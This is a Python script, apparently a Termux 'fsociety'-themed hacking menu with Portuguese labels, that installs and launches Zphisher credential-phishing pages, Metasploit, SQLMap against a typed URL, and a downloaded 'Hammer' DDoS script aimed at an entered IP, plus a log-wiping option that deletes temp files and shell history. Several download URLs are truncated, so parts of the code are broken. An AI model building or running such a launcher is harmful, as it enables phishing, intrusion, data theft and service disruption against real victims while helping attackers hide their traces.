
import os
import sys
import time
import subprocess
import shutil
import socket

# --- CONFIGURAÇÃO DE CORES ---
VERMELHO = '\033[31m'
VERDE    = '\033[32m'
AMARELO  = '\033[33m'
AZUL     = '\033[34m'
RESET    = '\033[0m'

# --- MOTOR DE AUTO-INSTALAÇÃO E SEGURANÇA ---

def confirmar_ataque(ferramenta, acao, riscos):
    """Explica o funcionamento e os riscos antes de cada ataque."""
    limpar_tela()
    print(f"{VERMELHO}⚠ AVISO DE PROTOCOLO: {ferramenta.upper()} ⚠{RESET}")
    print(f"\n{AMARELO}O QUE FAZ:{RESET}\n{acao}")
    print(f"\n{VERMELHO}RISCOS:{RESET}\n{riscos}")
    print(f"\n{AMARELO}──────────────────────────────────────────────────{RESET}")
    escolha = input(f"{VERDE}[?] Deseja prosseguir com a execução? (s/n): {RESET}").strip().lower()
    return escolha == 's'

def instalar_se_faltar(comando, pacote_pkg=None):
    if shutil.which(comando) is None:
        alvo = pacote_pkg if pacote_pkg else comando
        print(f"{VERMELHO}[!] {comando} ausente. Instalando {alvo}...{RESET}")
        os.system(f"pkg install {alvo} -y")

def download_ferramenta(arquivo, url):
    if not os.path.exists(arquivo):
        instalar_se_faltar("curl")
        print(f"{AMARELO}[*] Baixando componente essencial: {arquivo}...{RESET}")
        os.system(f"curl -L {url} -o {arquivo}")
        if arquivo.endswith(".sh"): os.system(f"chmod +x {arquivo}")

def limpar_tela():
    os.system('clear' if os.name == 'posix' else 'cls')

def animacao(texto):
    sys.stdout.write(f"{AMARELO}[*] {texto}")
    for _ in range(3):
        time.sleep(0.3)
        sys.stdout.write(".")
        sys.stdout.flush()
    print(f"{RESET}")

def obter_ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ".".join(ip.split('.')[:-1]) + ".0/24"
    except:
        return "192.168.1.0/24"

# --- INTERFACES VISUAIS ---

def exibir_banner():
    banner = r"""
███████╗██████╗ ██████╗  ██████╗ ██████╗
██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝
██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗
███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
"""
    print(f"{VERMELHO}{banner}{RESET}")
    print(f" | FSOCIETY PROTOCOL | 4.5 ULTIMATE")
    print(f"{VERMELHO}╔══════════════════════════════════════════════════════╗")
    print(f"║           SETOR ATUAL: CENTRAL DE COMANDO            ║")
    print(f"╚══════════════════════════════════════════════════════╝{RESET}")

def exibir_menu_principal():
    print(f"{VERDE}╔══════╦══════════╦════════════════════════════════════╗")
    print(f"║  ID  ║  MODULO  ║  DESCRICAO                         ║")
    print(f"╠══════╬══════════╬════════════════════════════════════╣")
    print(f"║  A   ║  ATTACK  ║  Menu de Ataque (Zphisher/Hammer)  ║")
    print(f"║  G   ║  GHOST   ║  Anonimato Total e Tor             ║")
    print(f"║  1   ║  ALPHA   ║  Scanner de ips (Nmap)             ║")
    print(f"║  2   ║  DELTA   ║  Busca de Dados (IP Geolocation)   ║")
    print(f"║  3   ║  SCAN    ║  Monitorar Dispositivos Wi-Fi      ║")
    print(f"║  4   ║  GUARD   ║  Antivirus e Scan de Malware       ║")
    print(f"║  5   ║  CLEAN   ║  Limpar Logs e Temporarios         ║")
    print(f"║  S   ║  SAIR    ║  Encerrar Sessao                   ║")
    print(f"╚══════╩══════════╩════════════════════════════════════╝{RESET}")

def exibir_menu_ataque():
    limpar_tela()
    print(f"{VERMELHO}")
    print(r"      _    _____ _____  _    ____ _  __")
    print(r"     / \  |_   _|_   _|/ \  / ___| |/ /")
    print(r"    / _ \   | |   | | / _ \| |   | ' / ")
    print(r"   / ___ \  | |   | |/ ___ \ |___| . \ ")
    print(r"  /_/   \_\ |_|   |_/_/   \_\____|_|\_\ ")
    print(f"\n  ╔════════════════════════════════════════════════╗")
    print(f"  ║ ID ║ MODULO       ║ DESCRICAO                  ║")
    print(f"  ╠════╬══════════════╬════════════════════════════╣")
    print(f"  ║ 1  ║ ZPHISHER     ║ Phishing Social            ║")
    print(f"  ║ 2  ║ METASPLOIT   ║ Exploitation Console       ║")
    print(f"  ║ 3  ║ SQLMAP       ║ Invasao de Banco de Dados  ║")
    print(f"  ║ 4  ║ TCPDUMP      ║ Sniffer de Rede (Defesa)   ║")
    print(f"  ║ 5  ║ HAMMER       ║ Ataque DDoS                ║")
    print(f"  ║ 0  ║ VOLTAR       ║ Retornar ao Menu Principal ║")
    print(f"  ╚════════════════════════════════════════════════╝{RESET}")

# --- MÓDULOS DE ATAQUE ---

def modulo_ataque():
    while True:
        exibir_menu_ataque()
        op = input(f"\n{VERMELHO}fsociety@attack:~# {RESET}").strip().lower()

        if op == '1':
            if confirmar_ataque("Zphisher", "Cria páginas falsas para capturar credenciais.", "Ilegal. Pode levar a crimes de estelionato e invasão."):
                instalar_se_faltar("git"); instalar_se_faltar("php"); instalar_se_faltar("curl")
                if not os.path.exists("zphisher"):
                    os.system("git clone --depth=1 https://github.com")
                os.system("cd zphisher && bash zphisher.sh")

        elif op == '2':
            if confirmar_ataque("Metasploit", "Acesso remoto e exploração de sistemas.", "Invasão de dispositivo. Crime previsto na Lei Carolina Dieckmann."):
                instalar_se_faltar("msfconsole", "metasploit")
                os.system("msfconsole")

        elif op == '3':
            if confirmar_ataque("SQLMap", "Extração de dados de servidores vulneráveis.", "Dano a banco de dados e roubo de informações sigilosas."):
                instalar_se_faltar("sqlmap")
                url = input(f"{AMARELO}URL Alvo: {RESET}")
                os.system(f"sqlmap -u {url} --batch --banner")

        elif op == '4':
            instalar_se_faltar("tcpdump")
            print(f"{AZUL}[*] Iniciando monitoramento básico (Tcpdump)...{RESET}")
            os.system("tcpdump -i any -n -c 50")
            input(f"\n{AMARELO}Pressione Enter...{RESET}")

        elif op == '5':
            if confirmar_ataque("Hammer (DDoS)", "Derruba conexões inundando o alvo com pacotes.", "Interrupção de serviço. Fácil rastreamento por órgãos de segurança."):
                download_ferramenta("hammer.py", "https://githubusercontent.com")
                alvo = input(f"{AMARELO}IP para DDoS: {RESET}")
                os.system(f"python hammer.py -s {alvo}")

        elif op == '0':
            break

# --- MAIN ---

def main():
    while True:
        limpar_tela()
        exibir_banner()
        exibir_menu_principal()

        op = input(f"\n{VERDE}fsociety@root:~# {RESET}").strip().lower()

        if op == 'a':
            modulo_ataque()
        elif op == 'g':
            instalar_se_faltar("tor")
            os.system("tor")
        elif op == '1':
            instalar_se_faltar("nmap")
            alvo = input(f"{AMARELO}Alvo: {RESET}")
            os.system(f"nmap -v -A {alvo}")
        elif op == '2':
            # Busca de Dados via IP Geolocation (API pública confiável)
            ip = input(f"{AMARELO}Digite o IP para localizar: {RESET}")
            animacao("Consultando Banco de Dados Geográfico")
            os.system(f"curl http://ip-api.com{ip}")
        elif op == '3':
            instalar_se_faltar("nmap")
            rede = obter_ip_local()
            print(f"{AZUL}[*] Escaneando dispositivos em {rede}...{RESET}")
            os.system(f"nmap -sn -PR {rede} | grep 'Nmap scan report for' | sed 's/Nmap scan report for //'")
        elif op == '4':
            instalar_se_faltar("clamscan", "clamav")
            os.system("clamscan -r ~/")
        elif op == '5':
            os.system("rm -rf $TMPDIR/* && history -c && history -w")
            print(f"{VERDE}[+] Logs e arquivos temporarios removidos.{RESET}")
            time.sleep(1)
        elif op == 's':
            os.system("pkill tor > /dev/null 2>&1")
            print(f"{VERMELHO}Sessao Encerrada. Goodbye, friend.{RESET}")
            sys.exit()

        input(f"\n{AMARELO}Pressione Enter para voltar...{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        os.system("pkill tor > /dev/null 2>&1")
        sys.exit()
      
